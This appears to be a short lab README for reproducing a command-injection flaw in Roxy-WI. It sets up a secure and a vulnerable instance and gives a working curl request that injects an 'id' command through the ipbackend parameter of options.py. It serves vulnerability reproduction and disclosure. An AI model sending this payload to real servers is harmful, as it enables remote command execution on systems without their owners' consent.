# secure instance
```bash
docker run -d --name roxy-wi -p 443:443 -p 8765:8765 registry.roxy-wi.org/roxy-wi
```
go to https://localhost

# vulnerable instance
Based on an ubuntu 24.04 virtual machine: 
```bash
bash vulnerableInstance.sh
# execute the exploit for `id` command
curl -X POST "https://localhost/app/options.py" --data "alert_consumer=1&serv=127.0.0.1&ipbackend=\";id+##&backend_server=127.0.0.1" -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --insecure
```
